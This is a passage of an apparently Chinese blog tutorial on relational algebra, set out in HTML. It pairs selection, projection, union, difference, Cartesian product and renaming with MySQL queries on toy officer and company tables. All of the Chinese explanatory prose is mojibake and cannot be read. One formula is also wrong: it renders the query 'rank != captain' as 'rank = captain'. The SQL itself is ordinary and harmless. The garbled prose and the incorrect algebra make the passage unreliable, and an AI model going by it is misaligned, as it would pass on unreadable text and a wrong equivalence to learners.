class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">45565</span>,&quot;CS-101&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">45565</span>,&quot;CS-319&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">76766</span>,&quot;BIO-101&quot;,<span class="number">1</span>,&quot;Summer&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">76766</span>,&quot;BIO-301&quot;,<span class="number">1</span>,&quot;Summer&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">83821</span>,&quot;CS-190&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">83821</span>,&quot;CS-190&quot;,<span class="number">2</span>,&quot;Spring&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">83821</span>,&quot;CS-319&quot;,<span class="number">2</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">98345</span>,&quot;EE-181&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2017</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åæ¥è¿™ä¸¤ä¸ªè¡¨æœ‰å˜åŠ¨,ä½†æ˜¯å˜åŠ¨ä¸å¤§</p>
<h3 id="é€‰æ‹©-sigma"><a href="#é€‰æ‹©-sigma" class="headerlink" title="é€‰æ‹©$\sigma$"></a>é€‰æ‹©$\sigma$</h3><p>$$<br>\sigma_{è°“è¯æ¡ä»¶}(å…³ç³»è¡¨)<br>$$</p>
<p>ä»ç›®æ ‡å…³ç³»è¡¨ä¸­é€‰å‡ºæ»¡è¶³æ¡ä»¶çš„å…ƒç»„è¡Œ</p>
<p>æ¯”å¦‚å¯¹äºä»¥ä¸‹troopè¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> age  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Tom    <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Vader  <span class="operator">|</span>   <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Anakin <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br></pre></td></tr></table></figure>

<p>$$<br>\sigma_{age&gt;20}(troop)<br>$$</p>
<p>å°±ç›¸å½“äº</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> troop <span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">20</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> age  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Vader <span class="operator">|</span>   <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>


<p>$$<br>select * from\ å…³ç³»è¡¨\ \color{red}where \color{white}\ å…³ç³»è°“è¯\longleftrightarrow\color{red}\sigma_{\color{white}å…³ç³»è°“è¯}\color{white}(å…³ç³»è¡¨)<br>$$</p>
<p>è¿™é‡Œå…³ç³»è°“è¯å°±æ˜¯å„ç§ç­‰äºä¸ç­‰äº,é€»è¾‘ä¸æˆ–é</p>
<p><strong>SQLä¸­çš„whereæ‰ç›¸å½“äºå…³ç³»ä»£æ•°ä¸­çš„$\sigma$</strong></p>
<h3 id="æŠ•å½±-Pi"><a href="#æŠ•å½±-Pi" class="headerlink" title="æŠ•å½±$\Pi$"></a>æŠ•å½±$\Pi$</h3><p>è¿˜æ˜¯å¯¹äºtroopè¡¨</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> troop;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span> age  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Tom    <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Vader  <span class="operator">|</span>   <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Anakin <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåªæƒ³è§‚å¯Ÿ(id,name)å±æ€§,å¿½ç•¥ageå±æ€§<br>$$<br>\Pi_{id,name}(troops)<br>$$<br>å°±ç›¸å½“äº</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,name <span class="keyword">from</span> troop;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Tom    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Vader  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Anakin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+--------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>$$<br>select\ å±æ€§1,å±æ€§2{â€¦}\ from (æ•°æ®è¡¨)&#x3D; \Pi_{å±æ€§1,å±æ€§2,â€¦}(æ•°æ®è¡¨)<br>$$</p>
<h3 id="ç»„åˆä½¿ç”¨-Pi-sigma"><a href="#ç»„åˆä½¿ç”¨-Pi-sigma" class="headerlink" title="ç»„åˆä½¿ç”¨$\Pi,\sigma$"></a>ç»„åˆä½¿ç”¨$\Pi,\sigma$</h3><p>ç°åœ¨åªå…³å¿ƒå†›é˜Ÿä¸­20å²ä»¥ä¸Šå£«å…µçš„(id,name),é‚£ä¹ˆ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,name <span class="keyword">from</span> troop <span class="keyword">where</span> age<span class="operator">&gt;</span><span class="number">20</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Vader <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>ç›¸å½“äº<br>$$<br>\Pi_{id,name}(\sigma_{age&gt;20}(troop))<br>$$<br>ç”±æ­¤å¯è§,$\sigma$è¿ç®—çš„ç»“æœä»ç„¶æ˜¯ä¸€å¼ è¡¨,å¯ä»¥åœ¨è¿™ä¸ªå­è¡¨ä¸Šå†è¿›è¡Œå…³ç³»è¿ç®—</p>
<h3 id="å¹¶-cup"><a href="#å¹¶-cup" class="headerlink" title="å¹¶$\cup$"></a>å¹¶$\cup$</h3><p>å‡è®¾å†›å®˜è¡¨é•¿è¿™æ ·</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> officer;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> age  <span class="operator">|</span> gender <span class="operator">|</span> rank      <span class="operator">|</span> position  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------+-----------+-----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> Vader <span class="operator">|</span>   <span class="number">50</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> marshal   <span class="operator">|</span> Army      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> Lisa  <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span>      <span class="number">0</span> <span class="operator">|</span> colonel   <span class="operator">|</span> Regiment  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> Rick  <span class="operator">|</span>   <span class="number">20</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> major     <span class="operator">|</span> Battalion <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> Rex   <span class="operator">|</span>   <span class="number">25</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> captain   <span class="operator">|</span> Company   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> Alpha <span class="operator">|</span>   <span class="number">23</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span> major     <span class="operator">|</span> Company   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">6</span> <span class="operator">|</span> Omega <span class="operator">|</span>   <span class="number">23</span> <span class="operator">|</span>      <span class="number">0</span> <span class="operator">|</span> brigadier <span class="operator">|</span> Brigade   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+------+--------+-----------+-----------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>id,å§“å,å¹´é¾„,æ€§åˆ«,å‡çº¿,èŒä½</p>
<p>ç°åœ¨æƒ³æŸ¥è¯¢æ‰€æœ‰ä¸Šæ ¡å›¢é•¿è¿˜æœ‰å‡†å°†æ—…é•¿çš„åå­—</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> name <span class="keyword">from</span> officer <span class="keyword">where</span> rank<span class="operator">=</span>&quot;colonel&quot; <span class="keyword">and</span> position<span class="operator">=</span>&quot;Regiment&quot; <span class="keyword">union</span> <span class="keyword">select</span> name <span class="keyword">from</span> officer <span class="keyword">where</span> rank<span class="operator">=</span>&quot;brigadier&quot; <span class="keyword">and</span> position<span class="operator">=</span>&quot;Brigade&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> Lisa  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> Omega <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>ç”¨å…³ç³»ä»£æ•°è¡¨ç¤ºå°±æ˜¯<br>$$<br>\Pi_{name}(\sigma_{rank&#x3D;colonel\ \land\ position&#x3D;Regiment}(officer) )\cup\Pi_{name}(\sigma_{rank&#x3D;brigadier\ \land\ position&#x3D;Brigade}(officer) )<br>$$</p>
<p>è¿™æ˜¯åœ¨åŒä¸€å¼ è¡¨ä¸Šè”åˆæŸ¥è¯¢,å¹¶è¿ç®—ä¹Ÿå…è®¸åœ¨ä¸¤å¼ è¡¨ä¸Šè”åˆæŸ¥è¯¢,ä½†æ˜¯è¦æ±‚çš„æ˜¯ä¸¤ç§å…³ç³»æ¨¡å‹çš„å±æ€§ä¸ªæ•°,ä»¥åŠæ¯ä¸ªå¯¹ç­‰ä½ç½®çš„å±æ€§çš„æ„ä¹‰éƒ½æ˜¯ç›¸åŒçš„.</p>
<p>æ¯”å¦‚</p>
<p>æµ·å†›å†›å®˜(id,å§“å,å¹´é¾„,æ€§åˆ«,å†›è¡”,èŒä½)</p>
<p>é™†å†›å†›å®˜(id,å§“å,å¹´é¾„,æ€§åˆ«,å†›è¡”,èŒä½)</p>
<p>è¿™é‡Œæµ·å†›å†›å®˜å’Œé™†å†›å†›å®˜ä¸¤ç§å…³ç³»å°±æ»¡è¶³è¦æ±‚</p>
<p>å¯ä»¥è”åˆæŸ¥è¯¢æµ·å†›å†›å®˜é‡Œé¢çš„ä¸Šæ ¡å›¢é•¿å’Œé™†å†›å†›å®˜é‡Œé¢çš„ä¸Šæ ¡å›¢é•¿</p>
<h3 id="å·®"><a href="#å·®" class="headerlink" title="å·®$-$"></a>å·®$-$</h3><p>r,sè¡¨ç¤ºä¸¤ç§å…³ç³»æ¨¡å‹,åˆ™r-sè¡¨ç¤ºåœ¨rä¸­ä½†æ˜¯ä¸åœ¨sä¸­çš„å…³ç³»å…ƒç»„</p>
<blockquote>
<p>ç±»ä¼¼äºé›†åˆçš„å®šä¹‰$A-B&#x3D;A-AB&#x3D;A(1-B)&#x3D;A\overline{B}$</p>
</blockquote>
<p>æ¯”å¦‚ä¸€èˆ¬æƒ…å†µä¸‹,è¿é•¿è¦ä¸Šå°‰å†›è¡”çš„å†›å®˜æ‹…ä»»,ç°åœ¨è¦åœ¨å†›å®˜è¡¨ä¸­æŸ¥è¯¢å†›è¡”ä¸æ˜¯ä¸Šå°‰çš„è¿é•¿çš„åå­—</p>
<p>å¯ä»¥å…ˆæŸ¥å‡ºè¿é•¿åè¡¨,ç„¶åå‡å»ä¸Šå°‰åè¡¨</p>
<p>ç„¶è€Œmysqlä¸æ”¯æŒexceptå’Œminuså…³é”®å­—,å¯ä»¥ç”¨not inä»£æ›¿</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> name <span class="keyword">from</span> officer</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span></span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> position<span class="operator">=</span>&quot;Company&quot; <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span>(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     <span class="keyword">select</span> name <span class="keyword">from</span> officer</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span>     <span class="keyword">where</span> rank<span class="operator">=</span>&quot;captain&quot;</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> Alpha <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>ç”¨å…³ç³»ä»£æ•°è¡¨ç¤ºç›¸å½“äº<br>$$<br>\Pi_{name}(\sigma_{position &#x3D; Company}(officer))-\Pi_{name}(\sigma_{rank&#x3D;captain}(officer))<br>$$<br>ç”±äºè¿™æ˜¯åœ¨åŒä¸€å¼ è¡¨ä¸­æŸ¥è¯¢çš„,å¯ä»¥ä¸ä½¿ç”¨å·®é›†,éƒ½å†™åœ¨è°“è¯é‡Œ</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> name <span class="keyword">from</span> officer <span class="keyword">where</span> position<span class="operator">=</span>&quot;Company&quot; <span class="keyword">and</span> rank <span class="operator">!=</span>&quot;captain&quot;;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="operator">|</span> Alpha <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç”¨å…³ç³»ä»£æ•°è¡¨ç¤ºç›¸å½“äº<br>$$<br>\Pi_{name}(\sigma_{position&#x3D;Company\ \land\ rank&#x3D;captain}(officer))<br>$$</p>
<h3 id="å·ç§¯-times"><a href="#å·ç§¯-times" class="headerlink" title="å·ç§¯$\times$"></a>å·ç§¯$\times$</h3><p>ä¸¤ä¸ªå…³ç³»r,sçš„ç¬›å¡å°”ä¹˜ç§¯$r\times s$æ„æ€æ˜¯rå’Œsçš„æ¯ä¸€è¡Œéƒ½è¦ç»„æˆä¸€è¡Œå¡«åˆ°æ–°è¡¨é‡Œ</p>
<p>å‡è®¾ç°åœ¨è¦ç»™æ‰€æœ‰è¿é•¿ä»»å‘½è¿é˜Ÿ,ç¬¦åˆè¦æ±‚çš„å†›å®˜æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from officer where position=&quot;Company&quot;;</span><br><span class="line">+----+-------+------+--------+---------+----------+</span><br><span class="line">| id | name  | age  | gender | rank    | position |</span><br><span class="line">+----+-------+------+--------+---------+----------+</span><br><span class="line">|  4 | Rex   |   25 |      1 | captain | Company  |</span><br><span class="line">|  5 | Alpha |   23 |      1 | major   | Company  |</span><br><span class="line">+----+-------+------+--------+---------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰è¿é˜Ÿæœ‰:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> Companies;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name      <span class="operator">|</span> popularity <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> the Brave <span class="operator">|</span>        <span class="number">120</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> the Loyal <span class="operator">|</span>        <span class="number">130</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> the Fast  <span class="operator">|</span>        <span class="number">110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆä¸¤ä¸ªè¿é•¿ä¸ä¸‰ä¸ªè¿é˜Ÿä¹‹é—´çš„æ‰€æœ‰ä»»å‘½æƒ…å†µä¸º</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> id,name,rank <span class="keyword">from</span> officer <span class="keyword">where</span> position<span class="operator">=</span>&quot;Company&quot;)<span class="keyword">as</span> Officer <span class="keyword">cross</span> <span class="keyword">join</span> companies;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+----+-----------+------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name  <span class="operator">|</span> rank    <span class="operator">|</span> id <span class="operator">|</span> name      <span class="operator">|</span> popularity <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+----+-----------+------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> Rex   <span class="operator">|</span> captain <span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> the Brave <span class="operator">|</span>        <span class="number">120</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> Alpha <span class="operator">|</span> major   <span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> the Brave <span class="operator">|</span>        <span class="number">120</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> Rex   <span class="operator">|</span> captain <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> the Loyal <span class="operator">|</span>        <span class="number">130</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> Alpha <span class="operator">|</span> major   <span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> the Loyal <span class="operator">|</span>        <span class="number">130</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">4</span> <span class="operator">|</span> Rex   <span class="operator">|</span> captain <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> the Fast  <span class="operator">|</span>        <span class="number">110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">5</span> <span class="operator">|</span> Alpha <span class="operator">|</span> major   <span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> the Fast  <span class="operator">|</span>        <span class="number">110</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-------+---------+----+-----------+------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œ<code>(select id,name,rank from officer where position=&quot;Company&quot;)as Officer</code>æ˜¯ç»™ç»“æœå­è¡¨èµ·äº†ä¸€ä¸ªåˆ«å(alias),å«åšOfficer,ä¸èµ·åˆ«åä¼šå¯¼è‡´mysqlæŠ¥é”™</p>
</blockquote>
<p>å†™æˆå…³ç³»ä»£æ•°å°±ç›¸å½“äº<br>$$<br>\Pi_{id,name,rank}(\sigma_{position&#x3D;Company}(officer))\times\ companies<br>$$</p>
<blockquote>
<p>è¿™ç§å¼å­åœ¨è®¡ç®—çš„æ—¶å€™éœ€è¦åŒºåˆ†ä¼˜å…ˆçº§,æœ€å¼€å§‹è®¡ç®—çš„åº”è¯¥æ˜¯<br>$$<br>A&#x3D;\sigma_{position&#x3D;Company}(officer)<br>$$</p>
<p>ç„¶åè®¡ç®—<br>$$<br>B&#x3D;\Pi_{id,name,rank}(A)<br>$$<br>æœ€åè®¡ç®—</p>
<p>$$<br>C&#x3D;B\times companies<br>$$</p>
</blockquote>
<h3 id="æ›´å-rho"><a href="#æ›´å-rho" class="headerlink" title="æ›´å$\rho$"></a>æ›´å$\rho$</h3><p>å®é™…ä¸Šå°±æ˜¯mysqlä¸­çš„aliasåˆ«å<br>$$<br>\rho_{alias(attr1,attr2,â€¦)}(Expression)<br>$$<br>å…¶ä¸­attr1å¯ä»¥æ˜¯åŸæ¥çš„å±æ€§å,ä¹Ÿå¯ä»¥æ˜¯å±æ€§åˆ«å</p>
<p>åœ¨è®¡ç®—å®ŒExpressionè¡¨è¾¾å¼ä¹‹å,å°†è¿”å›çš„ç»“æœ(ä¸€ä¸ªå…³ç³»å­é›†)å‘½åä¸ºalias</p>
<p>æ¯”å¦‚æŸ¥è¯¢å†›å®˜è¡¨ä¸­æ‰€æœ‰èŒä½ä¸ºè¿é•¿çš„å†›å®˜(id,name,rank),å°†è¯¥æŸ¥è¯¢å­è¡¨èµ·åCompanies</p>
